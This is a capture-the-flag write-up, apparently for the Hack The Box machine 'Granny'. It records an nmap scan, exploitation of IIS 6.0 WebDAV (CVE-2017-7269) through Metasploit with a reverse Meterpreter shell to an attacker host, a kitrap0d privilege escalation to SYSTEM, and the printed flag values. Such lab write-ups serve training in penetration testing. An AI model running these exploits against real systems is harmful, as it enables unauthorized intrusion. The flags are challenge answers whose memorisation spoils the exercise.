# Granny

## SYN Scan
```
nmap -sS -sV -O -p- -v -Pn -T4 -oA nmap/full_syn 10.10.10.15

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## RCE via Vulnerable IIS Version
`Microsoft IIS httpd 6.0` causes RCE.

CVE-2017-7269 => https://www.cvedetails.com/cve/CVE-2017-7269/

Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in `Internet Information Services (IIS) 6.0` in `Microsoft Windows Server 2003 R2` allows remote attackers to execute arbitrary code via a long header beginning with `If: <http://` in a PROPFIND request, as exploited in the wild in July or August 2016.

### Exploitation Using Metasploit Module
```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.15:80 - The target is vulnerable.

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.15:1030) at 2021-03-27 18:12:08 +0300

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 1000 created.
Channel 4 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\>whoami
whoami
nt authority\network service
```

## Privilege Escalation
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Launching notepad to host the exploit...
[+] Process 3756 launched.
[*] Reflectively injecting the exploit DLL into 3756...
[*] Injecting exploit into 3756 ...
[*] Exploit injected. Injecting payload into 3756...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 3 opened (10.10.14.11:4444 -> 10.10.10.15:1034) at 2021-03-27 19:27:11 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## The User Flag
```
C:\Documents and Settings\Lakis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Lakis\Desktop

04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  09:20 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,126,352,384 bytes free

C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b3e408f8703f67d1
```

## The Root Flag
```
C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  04:28 PM    <DIR>          .
04/12/2017  04:28 PM    <DIR>          ..
04/12/2017  09:17 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,126,356,480 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a6747bd06e9
```
